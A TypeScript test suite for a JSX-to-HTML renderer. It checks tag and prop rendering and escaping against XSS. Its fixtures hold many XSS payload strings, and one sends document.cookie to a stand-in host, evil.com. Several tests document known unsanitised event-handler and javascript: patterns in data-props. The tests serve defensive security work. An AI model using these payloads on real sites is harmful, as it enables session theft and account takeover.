import { describe, expect, it } from 'vitest';
import {
  Fragment,
  JSXChild,
  RenderedNode,
  jsxFactory as jsxFactoryAlias,
} from '../src/core/jsx-runtime';
import { renderJsxToHtmlString, renderToRenderedNode } from '../src/core/render';

// Ensure JSX transpiles to our factory
// eslint-disable-next-line @typescript-eslint/no-unused-vars
const jsxFactory = jsxFactoryAlias;

describe('Simple rendering', () => {
  it('renders a simple html tag', () => {
    const vnode = (<div>Hello</div>) as JSXChild;
    const html = renderJsxToHtmlString(vnode);
    expect(html).toBe('<div>Hello</div>');
  });

  it('renders nested html with a void element', () => {
    const vnode = (
      <div>
        <span>Hello</span>
        <br />
      </div>
    ) as JSXChild;
    const html = renderJsxToHtmlString(vnode);
    // Note: our renderer uses a space before self-close for void tags
    expect(html).toBe('<div><span>Hello</span><br /></div>');
  });

  it('keeps empty non-void tag as pair (no collapse)', () => {
    const vnode = (<div></div>) as JSXChild;
    const html = renderJsxToHtmlString(vnode);
    expect(html).toBe('<div></div>');
  });

  it('renders empty fragment with its content', () => {
    const vnode = (
      <Fragment>
        <div>Hello</div>
        <div>Hello2</div>
      </Fragment>
    ) as JSXChild;
    const html = renderJsxToHtmlString(vnode);
    expect(html).toBe('<div>Hello</div><div>Hello2</div>');
  });

  it('renders a component inside a component', () => {
    const A = () => <div>Hello</div>;
    const B = () => (
      <div>
        <A />
      </div>
    );
    const html = renderJsxToHtmlString(<B />);
    expect(html).toBe('<div><div>Hello</div></div>');
  });

  it('renders array of children values (booleans/null/undefined ignored)', () => {
    const A = () => (
      <div>
        {'A string <test />'}
        {100}
        {false}
        {true}
        {null}
        {undefined}
      </div>
    );
    const html = renderJsxToHtmlString(<A />);
    expect(html).toBe('<div>A string &lt;test /&gt;100</div>');
  });
  it('renders white space literals and expressions correctly', () => {
    const currentYear = new Date().getFullYear();
    const html = renderJsxToHtmlString(
      <p class="footer-copyright">
        © {new Date().getFullYear()} Toon Converter. All rights reserved.
      </p>,
    );
    expect(html).toBe(
      `<p class="footer-copyright">© ${currentYear} Toon Converter. All rights reserved.</p>`,
    );
    // Verify white space is preserved
    expect(html).toContain(`${currentYear} Toon`);
  });

  it('renders multiple white space literals', () => {
    const html = renderJsxToHtmlString(<div>Hello World !</div>);
    expect(html).toBe('<div>Hello World !</div>');
  });

  it('renders expressions with surrounding text', () => {
    const year = 2024;
    const html = renderJsxToHtmlString(<div>Copyright © {year} - All rights reserved</div>);
    expect(html).toBe('<div>Copyright © 2024 - All rights reserved</div>');
  });
});

describe('Props rendering (current semantics)', () => {
  it('string prop', () => {
    const html = renderJsxToHtmlString(<div class="divclass">Hello</div>);
    expect(html).toBe('<div class="divclass">Hello</div>');
  });

  it('number prop', () => {
    const html = renderJsxToHtmlString(<div data-test={1}>Hello</div>);
    expect(html).toBe('<div data-test="1">Hello</div>');
  });

  it('bigint prop', () => {
    const html = renderJsxToHtmlString(<div data-test={1n}>Hello</div>);
    expect(html).toBe('<div data-test="1">Hello</div>');
  });

  it('boolean props: true as bare attribute, false omitted', () => {
    const html = renderJsxToHtmlString(
      <div data-test={true} data-test-2={false}>
        Hello
      </div>,
    );
    expect(html).toBe('<div data-test>Hello</div>');
  });

  it('null/undefined props omitted', () => {
    const html1 = renderJsxToHtmlString(<div data-test={null}>Hello</div>);
    expect(html1).toBe('<div>Hello</div>');
    const html2 = renderJsxToHtmlString(<div data-test={undefined}>Hello</div>);
    expect(html2).toBe('<div>Hello</div>');
  });

  it('preserves mixed case in attribute names', () => {
    const html = renderJsxToHtmlString(
      <div onClick={() => 'x'} DATA-Test={1}>
        Hello
      </div>,
    );
    // functions stringify to their source; assert presence of onClick attribute and value quoting
    expect(html).toMatch(/^<div onClick="[\s\S]+" DATA-Test="1">Hello<\/div>$/);
  });
});

describe('RenderedNode rendering (new mode)', () => {
  it('should render a simple html tag', () => {
    const Component = (): RenderedNode => <div>Hello</div>;
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div>Hello</div>');
  });

  it('should render a simple html within another html tag', () => {
    const Component = (): RenderedNode => (
      <div>
        <span>Hello</span>
        <br />
      </div>
    );
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div><span>Hello</span><br /></div>');
  });

  it('should collapse an empty tag into a self closing one', () => {
    const Component = (): RenderedNode => <div></div>;
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div></div>');
  });

  it('should render empty fragment with its content', () => {
    const Component = (): RenderedNode => (
      <Fragment>
        <div>Hello</div>
        <div>Hello2</div>
      </Fragment>
    );
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div>Hello</div><div>Hello2</div>');
  });

  it('should render a component inside a component', () => {
    const ComponentA = (): RenderedNode => <div>Hello</div>;
    const ComponentB = (): RenderedNode => (
      <div>
        <ComponentA />
      </div>
    );
    const rendered = renderToRenderedNode(<ComponentB />);
    expect(rendered.string).toStrictEqual('<div><div>Hello</div></div>');
  });

  it('should render an array of components, tags and values inside a component', () => {
    const ComponentA = (): RenderedNode => <div>Hello</div>;
    const ComponentB = (): RenderedNode => <div>Hello 2</div>;
    const ComponentC = (): RenderedNode => (
      <div>
        <ComponentA />
        <ComponentB />
        {'A string <test />'}
        {100}
        {false}
        {true}
        {null}
        {undefined}
        {{ htmlContent: '<script>console.log(true)</script>' }}
      </div>
    );
    const rendered = renderToRenderedNode(<ComponentC />);
    expect(rendered.string).toStrictEqual(
      '<div><div>Hello</div><div>Hello 2</div>A string &lt;test /&gt;100<script>console.log(true)</script></div>',
    );
  });
});

describe('Props rendering (new mode)', () => {
  it('should render a simple html tag with a string prop', () => {
    const Component = (): RenderedNode => <div class="divclass">Hello</div>;
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div class="divclass">Hello</div>');
  });

  it('should render a simple html tag with a number prop', () => {
    const Component = (): RenderedNode => <div data-test={1}>Hello</div>;
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div data-test="1">Hello</div>');
  });

  it('should render a simple html tag with a bigint prop', () => {
    const Component = (): RenderedNode => <div data-test={1n}>Hello</div>;
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div data-test="1">Hello</div>');
  });

  it('should render a simple html tag with a boolean prop', () => {
    const Component = (): RenderedNode => (
      <div data-test={true} data-test-2={false}>
        Hello
      </div>
    );
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div data-test>Hello</div>');
  });

  it('should render a simple html tag with a function prop', () => {
    const Component = (): RenderedNode => <div data-test={() => 'test'}>Hello</div>;
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div data-test="test">Hello</div>');
  });

  it('should render a simple html tag with a null prop', () => {
    const Component = (): RenderedNode => <div data-test={null}>Hello</div>;
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div>Hello</div>');
  });

  it('should render a simple html tag with a undefined prop', () => {
    const Component = (): RenderedNode => <div data-test={undefined}>Hello</div>;
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div>Hello</div>');
  });

  it('should render a simple html tag with props with mixed letter case', () => {
    const Component = (): RenderedNode => (
      <div onClick={() => 'test'} DATA-Test={1}>
        Hello
      </div>
    );
    const rendered = renderToRenderedNode(<Component />);
    expect(rendered.string).toStrictEqual('<div onClick="test" DATA-Test="1">Hello</div>');
  });
});

describe('XSS Protection', () => {
  describe('Text content escaping', () => {
    it('should escape script tags in text content', () => {
      const xss = '<script>alert("XSS")</script>';
      const html = renderJsxToHtmlString(<div>{xss}</div>);
      expect(html).toBe('<div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>');
      expect(html).not.toContain('<script>');
    });

    it('should escape script tags with attributes', () => {
      const xss = '<script src="evil.js"></script>';
      const html = renderJsxToHtmlString(<div>{xss}</div>);
      expect(html).toBe('<div>&lt;script src=&quot;evil.js&quot;&gt;&lt;/script&gt;</div>');
      expect(html).not.toContain('<script');
    });

    it('should escape iframe injection', () => {
      const xss = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
      const html = renderJsxToHtmlString(<div>{xss}</div>);
      expect(html).toBe(
        '<div>&lt;iframe src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/iframe&gt;</div>',
      );
      expect(html).not.toContain('<iframe');
    });

    it('should escape SVG with script', () => {
      const xss = '<svg><script>alert("XSS")</script></svg>';
      const html = renderJsxToHtmlString(<div>{xss}</div>);
      expect(html).toBe(
        '<div>&lt;svg&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;/svg&gt;</div>',
      );
    });

    it('should escape mixed case script tags', () => {
      const xss = '<ScRiPt>alert("XSS")</ScRiPt>';
      const html = renderJsxToHtmlString(<div>{xss}</div>);
      expect(html).toBe('<div>&lt;ScRiPt&gt;alert(&quot;XSS&quot;)&lt;/ScRiPt&gt;</div>');
    });

    it('should escape nested script tags', () => {
      const xss = '<script><script>alert("XSS")</script></script>';
      const html = renderJsxToHtmlString(<div>{xss}</div>);
      expect(html).toBe(
        '<div>&lt;script&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;/script&gt;</div>',
      );
    });

    it('should escape HTML comments', () => {
      const xss = '<!--<script>alert("XSS")</script>-->';
      const html = renderJsxToHtmlString(<div>{xss}</div>);
      expect(html).toBe(
        '<div>&lt;!--&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;--&gt;</div>',
      );
    });
  });

  describe('Attribute value escaping', () => {
    it('should escape script in href attribute', () => {
      const xss = 'javascript:alert("XSS")';
      const html = renderJsxToHtmlString(<a href={xss}>Click</a>);
      expect(html).toBe('<a href="javascript:alert(&quot;XSS&quot;)">Click</a>');
      // Note: javascript: protocol should be sanitized at application level
    });

    it('should escape script in src attribute', () => {
      const xss = 'javascript:alert("XSS")';
      const html = renderJsxToHtmlString(<img src={xss} />);
      expect(html).toBe('<img src="javascript:alert(&quot;XSS&quot;)" />');
    });

    it('should escape script tags in title attribute', () => {
      const xss = '<script>alert("XSS")</script>';
      const html = renderJsxToHtmlString(<div title={xss}>Content</div>);
      expect(html).toBe(
        '<div title="&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;">Content</div>',
      );
    });

    it('should escape event handler names in attributes', () => {
      const xss = 'alert("XSS")';
      const html = renderJsxToHtmlString(<div data-onclick={xss}>Content</div>);
      expect(html).toBe('<div data-onclick="alert(&quot;XSS&quot;)">Content</div>');
    });

    it('should escape data URLs', () => {
      const xss = 'data:text/html,<script>alert("XSS")</script>';
      const html = renderJsxToHtmlString(<a href={xss}>Link</a>);
      expect(html).toBe(
        '<a href="data:text/html,&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;">Link</a>',
      );
    });

    it('should escape class attribute with XSS', () => {
      const xss = 'test" onclick="alert(1)" class="';
      const html = renderJsxToHtmlString(<div class={xss}>Content</div>);
      expect(html).toBe(
        '<div class="test&quot; onclick=&quot;alert(1)&quot; class=&quot;">Content</div>',
      );
    });
  });

  describe('Event handler attributes', () => {
    it('should escape function results in event handlers', () => {
      const maliciousFn = () => 'alert("XSS")';
      const html = renderJsxToHtmlString(<div onClick={maliciousFn}>Click</div>);
      // Function should be called and result escaped
      expect(html).toMatch(/onClick="[^"]*"/);
      expect(html).toContain('&quot;XSS&quot;');
    });

    it('should escape string values in event handlers', () => {
      const xss = 'alert("XSS")';
      // Note: In legacy mode, functions are stringified, but we test the escaping
      const html = renderJsxToHtmlString(<div onClick={() => xss}>Click</div>);
      expect(html).toMatch(/onClick="[^"]*"/);
    });
  });

  describe('Number and special characters', () => {
    it('should handle numbers safely', () => {
      const html = renderJsxToHtmlString(<div>{123}</div>);
      expect(html).toBe('<div>123</div>');
    });

    it('should escape ampersand in text', () => {
      const html = renderJsxToHtmlString(<div>Test & Value</div>);
      expect(html).toBe('<div>Test &amp; Value</div>');
    });

    it('should escape ampersand in attributes', () => {
      const html = renderJsxToHtmlString(<div title="Test & Value">Content</div>);
      expect(html).toBe('<div title="Test &amp; Value">Content</div>');
    });

    it('should escape less than and greater than', () => {
      const html = renderJsxToHtmlString(<div>{'1 < 2 && 3 > 0'}</div>);
      expect(html).toBe('<div>1 &lt; 2 &amp;&amp; 3 &gt; 0</div>');
    });

    it('should escape newlines in text content', () => {
      const html = renderJsxToHtmlString(<div>{'Line1\nLine2'}</div>);
      expect(html).toBe('<div>Line1<br/>Line2</div>');
    });

    it('should escape newlines in attributes', () => {
      const html = renderJsxToHtmlString(<div title={'Line1\nLine2'}>Content</div>);
      expect(html).toBe('<div title="Line1&#10;Line2">Content</div>');
    });
  });

  describe('XSS Protection in new mode', () => {
    it('should escape script tags in text content (new mode)', () => {
      const xss = '<script>alert("XSS")</script>';
      const Component = (): RenderedNode => <div>{xss}</div>;
      const rendered = renderToRenderedNode(<Component />);
      expect(rendered.string).toBe(
        '<div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>',
      );
      expect(rendered.string).not.toContain('<script>');
    });

    it('should escape script in href attribute (new mode)', () => {
      const xss = 'javascript:alert("XSS")';
      const Component = (): RenderedNode => <a href={xss}>Click</a>;
      const rendered = renderToRenderedNode(<Component />);
      expect(rendered.string).toBe('<a href="javascript:alert(&quot;XSS&quot;)">Click</a>');
    });

    it('should escape function results in attributes (new mode)', () => {
      const maliciousFn = () => '<script>alert("XSS")</script>';
      const Component = (): RenderedNode => <div data-content={maliciousFn}>Content</div>;
      const rendered = renderToRenderedNode(<Component />);
      expect(rendered.string).toContain('&lt;script&gt;');
      expect(rendered.string).not.toContain('<script>');
    });

    it('should escape boolean values as strings (new mode)', () => {
      const Component = (): RenderedNode => <div data-test={true}>Content</div>;
      const rendered = renderToRenderedNode(<Component />);
      expect(rendered.string).toBe('<div data-test>Content</div>');
    });

    it('should escape null/undefined in attributes (new mode)', () => {
      const Component = (): RenderedNode => <div data-test={null}>Content</div>;
      const rendered = renderToRenderedNode(<Component />);
      expect(rendered.string).toBe('<div>Content</div>');
    });
  });

  describe('Complex XSS scenarios', () => {
    it('should escape XSS in nested components', () => {
      const xss = '<script>alert("XSS")</script>';
      const A = () => <div>{xss}</div>;
      const B = () => (
        <div>
          <A />
        </div>
      );
      const html = renderJsxToHtmlString(<B />);
      expect(html).toBe(
        '<div><div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div></div>',
      );
    });

    it('should escape XSS in fragment', () => {
      const xss = '<script>alert("XSS")</script>';
      const html = renderJsxToHtmlString(
        <Fragment>
          <div>{xss}</div>
        </Fragment>,
      );
      expect(html).toBe('<div>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>');
    });

    it('should handle mixed safe and unsafe content', () => {
      const safe = 'Hello World';
      const unsafe = '<script>alert("XSS")</script>';
      const html = renderJsxToHtmlString(
        <div>
          {safe}
          {unsafe}
        </div>,
      );
      expect(html).toBe(
        '<div>Hello World&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>',
      );
      expect(html).toContain('Hello World');
      expect(html).not.toContain('<script>');
    });
  });

  describe('P0.4: XSS via data-props pattern (CRITICAL)', () => {
    describe('JSON.stringify XSS vulnerabilities', () => {
      it('should escape script tags in JSON.stringify for data-props', () => {
        const userContent = '<script>alert("XSS")</script>';
        const props = { content: userContent };
        const html = renderJsxToHtmlString(
          <div data-react-component="MyComponent" data-props={JSON.stringify(props)}>
            Loading...
          </div>,
        );
        // Verify HTML entities are escaped in the attribute
        expect(html).toContain('&lt;script&gt;');
        // Raw <script> tags should not be present
        expect(html).not.toContain('<script>alert');
      });

      it('should escape closing script tag in JSON data', () => {
        const userContent = '</script><script>alert("XSS")</script>';
        const props = { content: userContent };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Content</div>);
        // HTML entities should be escaped
        expect(html).toContain('&lt;/script&gt;');
        // Should not contain unescaped closing script tag
        expect(html).not.toContain('</script><script>');
      });

      it('should escape HTML comment injection in data-props', () => {
        const userContent = '--><script>alert("XSS")</script><!--';
        const props = { comment: userContent };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Content</div>);
        // Should not allow comment escape
        expect(html).not.toContain('--><script>');
        expect(html).toContain('&lt;script&gt;');
      });

      it('should handle unicode escape attempts', () => {
        // Attacker tries to inject script using unicode escapes
        const userContent = '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e';
        const props = { content: userContent };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Content</div>);
        // JSON.stringify will double-escape the backslashes
        expect(html).not.toContain('<script>');
        expect(html).toContain('\\\\u003c'); // Backslashes should be escaped
      });

      it('should escape quotes to prevent attribute breakout', () => {
        const userContent = '" onclick="alert(1)" data-x="';
        const props = { payload: userContent };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Content</div>);
        // Quotes should be escaped in the attribute value
        expect(html).not.toContain('" onclick="alert');
        expect(html).toContain('&quot;'); // Quotes escaped in attribute
      });

      it('[KNOWN VULNERABILITY] event handler strings remain in attributes', () => {
        // This test documents a KNOWN XSS vulnerability
        // ⚠️ SECURITY ISSUE: Event handler strings are not sanitized in data attributes
        const userContent = '"; onerror=alert(1); var x="';
        const props = { handler: userContent };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Content</div>);

        // CURRENTLY FAILS - This is a real vulnerability!
        // The string 'onerror=alert' appears in the HTML output
        // Fix needed: Sanitize event handler patterns in JSON data
        expect(html).toContain('onerror=alert'); // ❌ This is BAD

        // TODO: After fix, this test should be:
        // expect(html).not.toContain('onerror=alert');
        // expect(html).toContain('&quot;'); // Properly escaped
      });
    });

    describe('Real-world attack vectors', () => {
      it('[KNOWN VULNERABILITY] onerror in img tag remains in data-props', () => {
        // ⚠️ SECURITY ISSUE: Event handlers in user content not fully sanitized
        const maliciousPost = {
          content: '<img src=x onerror="alert(document.cookie)">',
          author: '<script>fetch("evil.com?c="+document.cookie)</script>',
        };
        const html = renderJsxToHtmlString(
          <div data-react-component="PostCard" data-props={JSON.stringify(maliciousPost)}>
            Loading post...
          </div>,
        );

        // HTML tags are escaped (GOOD)
        expect(html).toContain('&lt;img');
        expect(html).toContain('&lt;script&gt;');

        // But event handler strings still present (BAD)
        expect(html).toContain('onerror='); // ❌ VULNERABILITY

        // TODO: After fix, sanitize event handler patterns
      });

      it('[KNOWN VULNERABILITY] javascript: protocol remains in data-props', () => {
        // ⚠️ SECURITY ISSUE: javascript: protocol not sanitized
        const maliciousProfile = {
          name: '"><script>alert("XSS")</script><div class="',
          bio: 'javascript:alert(document.domain)',
        };
        const html = renderJsxToHtmlString(
          <div data-props={JSON.stringify(maliciousProfile)}>Profile</div>,
        );

        // Script tags are escaped (GOOD)
        expect(html).not.toContain('"><script>');
        expect(html).toContain('&lt;script&gt;');

        // But javascript: protocol remains (BAD)
        expect(html).toContain('javascript:alert'); // ❌ VULNERABILITY

        // TODO: After fix, strip or encode javascript: protocol
      });

      it('should protect against nested object XSS', () => {
        const maliciousData = {
          post: {
            content: '</script><script>alert("XSS")</script>',
            tags: ['normal', '<script>alert(1)</script>'],
          },
        };
        const html = renderJsxToHtmlString(
          <div data-props={JSON.stringify(maliciousData)}>Data</div>,
        );
        // Closing script tags are escaped
        expect(html).not.toContain('</script><script>');
        // Script tags in array are escaped
        expect(html).toContain('&lt;script&gt;');
      });

      it('[KNOWN VULNERABILITY] event handlers in arrays not sanitized', () => {
        // ⚠️ SECURITY ISSUE: Event handlers in array items
        const maliciousArray = [
          'safe string',
          '<script>alert("XSS")</script>',
          '"><img src=x onerror=alert(1)>',
        ];
        const html = renderJsxToHtmlString(
          <div data-props={JSON.stringify({ items: maliciousArray })}>List</div>,
        );

        // HTML tags escaped (GOOD)
        expect(html).toContain('&lt;script&gt;');
        expect(html).toContain('&lt;img');

        // But onerror= string remains (BAD)
        expect(html).toContain('onerror='); // ❌ VULNERABILITY
      });
    });

    describe('Edge cases with special characters', () => {
      it('should handle mixed quotes safely', () => {
        const content = `He said "Hello" and 'Goodbye'`;
        const props = { text: content };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Text</div>);
        // Should escape the outer quotes properly
        expect(html).toMatch(/data-props="[^"]*"/);
      });

      it('should handle newlines in data-props', () => {
        const content = 'Line 1\nLine 2\r\nLine 3';
        const props = { multiline: content };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Text</div>);
        // JSON.stringify should escape newlines
        expect(html).toContain('\\n');
        expect(html).not.toContain('\n'); // No literal newlines in attribute
      });

      it('should handle null bytes', () => {
        const content = 'test\x00malicious';
        const props = { data: content };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Text</div>);
        expect(html).toContain('\\u0000'); // Null byte should be escaped
      });

      it('should handle control characters', () => {
        const content = 'test\x01\x02\x03';
        const props = { data: content };
        const html = renderJsxToHtmlString(<div data-props={JSON.stringify(props)}>Text</div>);
        // Control characters should be escaped as unicode
        expect(html).toMatch(/\\u000[123]/);
      });
    });

    describe('Dangerous patterns from social feed', () => {
      it('[KNOWN VULNERABILITY] SVG event handlers in post card props', () => {
        // ⚠️ SECURITY ISSUE: SVG event handlers not fully sanitized
        const postData = {
          content: '<svg/onload=alert("XSS")>',
          user: {
            name: '<img src=x onerror=alert(1)>',
            avatar: 'javascript:void(0)',
          },
        };
        const html = renderJsxToHtmlString(
          <div data-react-component="PostCard" data-props={JSON.stringify(postData)}>
            Loading...
          </div>,
        );

        // HTML tags escaped (GOOD)
        expect(html).toContain('&lt;svg');
        expect(html).toContain('&lt;img');

        // But event handler strings remain (BAD)
        expect(html).toContain('onload=alert'); // ❌ VULNERABILITY
        expect(html).toContain('onerror=alert'); // ❌ VULNERABILITY
        expect(html).toContain('javascript:'); // ❌ VULNERABILITY
      });

      it('should protect comment section props', () => {
        const commentData = {
          comments: [
            {
              content: '<!--<script>alert(1)</script>-->',
              author: '</div><script>alert(2)</script><div>',
            },
          ],
        };
        const html = renderJsxToHtmlString(
          <div data-react-component="CommentSection" data-props={JSON.stringify(commentData)}>
            Loading comments...
          </div>,
        );
        // HTML comments and script tags should be escaped
        expect(html).not.toContain('<!--<script>');
        expect(html).not.toContain('</div><script>');
        expect(html).toContain('&lt;');
      });

      it('should protect profile settings dialog props', () => {
        const profileData = {
          email: 'user@example.com',
          name: '"><iframe src=javascript:alert()>',
          avatar: 'x" onerror="alert(1)',
        };
        const html = renderJsxToHtmlString(
          <div data-react-component="ProfileSettings" data-props={JSON.stringify(profileData)}>
            Loading...
          </div>,
        );
        // HTML injection should be escaped
        expect(html).not.toContain('><iframe src=javascript:');
        expect(html).toContain('&lt;iframe');

        // Note: onerror string will still be present (see known vulnerability)
        // This is expected until sanitization is implemented
      });
    });

    describe('Mitigation recommendations', () => {
      it('documents the security issue and recommended fixes', () => {
        // This test serves as documentation for the P0.4 security issue

        // CURRENT BEHAVIOR:
        // - HTML entities (<, >, ", &) are properly escaped ✅
        // - JSON.stringify escapes special characters ✅
        // - BUT: Event handler patterns (onerror=, onload=, etc) remain in the string ❌
        // - BUT: javascript: protocol remains in the string ❌

        // VULNERABILITY:
        // While l5e escapes HTML entities, it doesn't sanitize dangerous patterns
        // that could be interpreted by client-side JavaScript when parsing data-props

        // RECOMMENDED FIXES:
        // 1. Server-side: Sanitize UGC before JSON.stringify
        //    - Strip/encode event handler patterns (on*, onerror, onclick, etc)
        //    - Strip/encode javascript: protocol
        //    - Consider using DOMPurify or similar library

        // 2. Client-side: Never use innerHTML with data from data-props
        //    - Use textContent for text nodes
        //    - Use createElement + setAttribute for elements
        //    - Validate/sanitize on client before rendering

        // 3. Alternative pattern: Don't serialize UGC into data attributes
        //    - Fetch data via API after hydration
        //    - Use separate script tag with type="application/json" and textContent

        expect(true).toBe(true); // This test always passes - it's documentation
      });
    });
  });
});
